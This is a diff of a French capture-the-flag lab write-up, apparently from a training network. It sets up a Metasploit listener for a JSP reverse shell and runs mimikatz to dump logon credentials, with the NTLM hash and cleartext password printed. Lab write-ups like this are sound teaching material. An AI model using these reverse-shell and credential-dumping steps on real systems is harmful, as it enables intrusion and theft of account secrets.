@@ -14,8 +14,8 @@
 - **10.10.40.122**	*flag : AST16{d3f4u17_cr3d5_3v3rywh3r3}*
 - **10.10.40.128**	*flag : AST16{up104d_w17h_57y13_15_n07_3n0u6h}*
 - **10.10.40.138**	*flag : EHK17{1a86ff7923c40c9ccd806ee5036d363c068ccc4d}*
-- **10.10.40.168**	*flag : t*
-- **10.10.40.231**	*flag : not found yet*
+- **10.10.40.168**	*flag : AST16{1234AST16backAdmin}*
+- **10.10.40.231**	*flag : not found*
 
 ## Scanning 
 
@@ -495,7 +495,7 @@ Ensuite, on a créé le `listener` à l'aide de `metasploit` comme suit :
 
 ````shell
 use exploit/multi/handler
-set payload java/jsp_sheéé_reverse_tcp
+set payload java/jsp_shell_reverse_tcp
 set LHOST 10.10.42.12
 set LPORT 5555
 exploit
@@ -520,46 +520,64 @@ in order to have the flag !!!
 Enjoy
 ``````
 
+Pour avoir le flag complet, nous avons cherché le mot de passe de l'administrateur. En parcourant les répertoires nous sommes tombées sur l'utilitaire `mimikatz` présent dans `C:\Users`.
+
+````shell
+#Lancement mimikatz
+C:\Users>mimikatz.exe
+mimikatz.exe
+
+  .#####.   mimikatz 2.1.1 (x64) built on Aug 13 2017 17:27:53
+ .## ^ ##.  "A La Vie, A L'Amour"
+ ## / \ ##  /* * *
+ ## \ / ##   Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ '## v ##'   http://blog.gentilkiwi.com/mimikatz             (oe.eo)
+  '#####'                                     with 21 modules * * */
 
 
-
-
-
-
-Flag : `AST16{administrator password here}`
-
-
-
-
-
-
-
-
-
-https://nullarmor.github.io/posts/jerry
-
-
-
-Scan des dossiers selon les plus connu
-
-````
-dirb http://www.corporation-sa.com
----- Scanning URL: http://www.corporation-sa.com/ ----
-+ http://www.corporation-sa.com/css (CODE:302|SIZE:0) 
-+ http://www.corporation-sa.com/fonts (CODE:302|SIZE:0)   
-+ http://www.corporation-sa.com/img (CODE:302|SIZE:0)
-+ http://www.corporation-sa.com/js (CODE:302|SIZE:0)
+#Vérification privilège
+mimikatz # privilege::debug
+Privilege '20' OK
 ````
 
+Puis nous avons utilisé la commande `SEKURLSA::Logonpasswords` qui permet de lister les noms d'utilisateurs et mots de passe récemment utilisés sur la machine
 
+````shell
+mimikatz # sekurlsa::logonpasswords
 
-https://medium.com/@arkanoidctf/hackthebox-writeup-jerry-aa2b992917a7
+Authentication Id : 0 ; 139030 (00000000:00021f16)
+Session           : Interactive from 0
+User Name         : Gagou
+Domain            : WIN-A9N14JRU9ZT
+Logon Server      : WIN-A9N14JRU9ZT
+Logon Time        : 26/10/2020 07:36:50
+SID               : S-1-5-21-3936968770-2739974228-1943027205-1000
+        msv :
+         [00000002] Primary
+         * Username : Gagou
+         * Domain   : WIN-A9N14JRU9ZT
+         * NTLM     : de89fdea6ca42d00e68a7ac4162cb3ee
+         * SHA1     : c2da56740fe5e73225376a93d846215fd8159cdf
+        tspkg :
+         * Username : Gagou
+         * Domain   : WIN-A9N14JRU9ZT
+         * Password : 1234AST16backAdmin
+        wdigest :
+         * Username : Gagou
+         * Domain   : WIN-A9N14JRU9ZT
+         * Password : 1234AST16backAdmin
+        kerberos :
+         * Username : Gagou
+         * Domain   : WIN-A9N14JRU9ZT
+         * Password : 1234AST16backAdmin
+        ssp :
+        credman :
+#.... tronqué
+````
 
+On voit donc que c'est le même mot de passe utilisé pour tous les services. Nous en déduisons que c'est le mot de passe administrateur qui est la partie manquante de notre flag.
 
-
-
-
-
+Flag : `AST16{1234AST16backAdmin}`
 
 
 
